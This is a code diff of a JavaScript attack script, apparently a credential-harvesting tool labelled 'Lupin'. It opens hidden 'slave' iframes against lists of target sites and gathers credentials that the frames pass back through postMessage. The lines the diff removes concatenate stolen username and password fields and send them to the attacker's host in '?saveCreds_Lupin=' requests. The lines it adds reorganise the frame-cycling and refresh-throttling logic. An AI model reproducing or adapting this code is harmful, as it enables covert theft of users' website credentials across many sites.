@@ -1,12 +1,8 @@
 var creds = "";
-var bundle = 1;
-var maxSlaves = 10;
-var checkLimit = 30;
-var waitTime = 1000;
 var check = 0;
 var finishedSlaves = 0;	
+var numSlaves = 1;
 var pause;
-var numSlaves;
 var targetIndexArray;
 var chunkLenArray;
 
@@ -31,8 +27,12 @@ function moveSrc(slaveFrameNum)
 	var slaveFrameName = "slaveFrame"+slaveFrameNum.toString();
         var slaveFrame= document.getElementsByName(slaveFrameName)[0]; 
 	var src = targets[targetIndexArray[slaveFrameNum]];
-	targetIndexArray[slaveFrameNum] +=1;	
-        slaveFrame.setAttribute('src', deobfs(src));
+
+
+	targetIndexArray[slaveFrameNum] +=numSlaves;	
+	//d = deobfs(src)
+	chunkLenArray[slaveFrameNum]-= 1;
+        slaveFrame.setAttribute('src', src );
 	return 1;
 }
 
@@ -44,11 +44,6 @@ function createSlaveFrame(slaveFrameNum)
         slaveFrame.setAttribute("width", "100");
         slaveFrame.setAttribute("id", "slaveFrame"+slaveFrameNum.toString());
         slaveFrame.setAttribute("name", "slaveFrame"+slaveFrameNum.toString());
-
-	if (slaveFrameNum == -1)
-	{
-        	slaveFrame.setAttribute("src","http://"+document.location.hostname+"?sendOK_Lupin=1");         
-        }
       	document.body.appendChild(slaveFrame); 
 	
 
@@ -65,29 +60,38 @@ function advanceSlaves()
 	check=0;
 	for(var i=0; i<numSlaves;i++)
 	{
-		if(targetIndexArray[i] < chunkLenArray[i])
+		if(chunkLenArray[i] > 0)
 		{
-			
-			if (check >=0 && check < checkLimit)
-			{
-				check+=1;
+			if(limitRefresh == -1){
 				moveSrc(i);
 			}else
-			{
-				check = -1;
-				continue;
+			{		
+				if (check >=0 && check < limitRefresh)
+				{		
+					check+=1;
+					moveSrc(i);
+									
+				}else
+				{
+					check = -1;
+					continue;
+				}
 			}
 		}	
 			
 	}
-	setTimeout("advanceSlaves()",waitTime);
 
+	
+	if (sleepInterval > 0){
+		setTimeout("advanceSlaves()",sleepInterval);
+	}
 }
 
        
            
 function onMessage (event)
 {
+
 	var m = event.data;
 	if(m.indexOf("focus") != -1)
 	{
@@ -100,64 +104,46 @@ function onMessage (event)
 		return;
 	}
 
-        var cash = m.indexOf("$$$");
-        var slaveFrameName = m.substring(0,cash);
+	var slaveFrameName = m;
         var slaveFrameNum = parseInt(slaveFrameName.substring(10));
-        m = m.substring(cash+3);
-	var arr = m.split(",");
-	var cut;
-	var credCount;
-	var moved;
-	
-        if (m != "")
-	{
-	        creds+="|"+arr[0]+"|"+arr[1]+"|"+arr[2]+"|||||";
 
-        }
-      
-	if(check >= 0 && check < checkLimit)
-	{
-		if(targetIndexArray[slaveFrameNum] < chunkLenArray[slaveFrameNum])
+	if(limitRefresh == -1){
+		if(chunkLenArray[slaveFrameNum] > 0)
 		{
 			if (pause == false)
 			{
 				moveSrc(slaveFrameNum);
-				check+=1;
 			}
 		}
 	}else
 	{
-		check = -1;
+		if(check >= 0 && check < limitRefresh)
+		{
+			if(chunkLenArray[slaveFrameNum] > 0)
+			{
+				if (pause == false)
+				{
+					moveSrc(slaveFrameNum);
+					check+=1;
+				}
+			}
+		}else
+		{
+			check = -1;
+		}
 	}
 
-        if(targetIndexArray[slaveFrameNum] == chunkLenArray[slaveFrameNum])
+        if(chunkLenArray[slaveFrameNum] == 0)
 	{
 	        finishedSlaves+=1;
-		alert(finishedSlaves);
         }
   	
-        cut = creds.lastIndexOf("|||||");
-        if(finishedSlaves == numSlaves)
+	if(finishedSlaves == numSlaves)
 	{
-		src = "http://"+document.location.hostname+"?sendCleanUp_Lupin=1";		
-	        if(cut > -1)
-		{     
-			src = src+"&saveCreds_Lupin="+creds.substring(0,cut);
-		}
-		alert(src);
-	        document.location.replace(src);        
-		return;  
-        }else
-	{   
-		credCount = creds.split("|||||").length - 1;
-                if(credCount == bundle)
-		{   
-                     sendFrame = document.getElementsByName("slaveFrame-1")[0];
-   	             src = "http://"+document.location.hostname+"?sendOK_Lupin=1&saveCreds_Lupin="+creds.substring(0,cut);
-                     sendFrame.setAttribute('src',src);               
-                     creds = "";
-               }
-        }  
+		src = "http://"+document.location.hostname+"?sendCleanUp_Lupin=1";
+		document.location.replace(src);      
+	}  
+	
 
 }   	
 
@@ -166,39 +152,37 @@ function onMessage (event)
 
 function init()
 {
-	var rem;
-	if(targets.length > maxSlaves)
+
+	if(targets.length > 10)
 	{
-		numSlaves = maxSlaves;
-	}else
-	{
-		numSlaves = targets.length;
+		numSlaves = 10;
 	}
- 
+
 	targetIndexArray = new Array(numSlaves);
 	chunkLenArray = new Array(numSlaves);
 
 	var chunkLen = Math.floor(targets.length / numSlaves);
+	var rem = targets.length - numSlaves*chunkLen;
 
-      	tmp = 0;
-	rem = targets.length - numSlaves*chunkLen;
        	for(var i=0; i<numSlaves;i++)
 	{
-       		targetIndexArray[i] = tmp;
-    		tmp += chunkLen;
+       		targetIndexArray[i] = i;
+
+		chunkLenArray[i] = chunkLen;
 		if(i<rem)
 		{
-			tmp+=1;
+			chunkLenArray[i] +=1;
+
     		}
-		chunkLenArray[i] = tmp;
        	}
 	
-	for(var i=-1;i<numSlaves;i+=1)
+	for(var i=0;i<numSlaves;i+=1)
 	{
                 createSlaveFrame(i);
       	}
 
 	window.addEventListener ("message", onMessage, false);
+	
 
 }
 
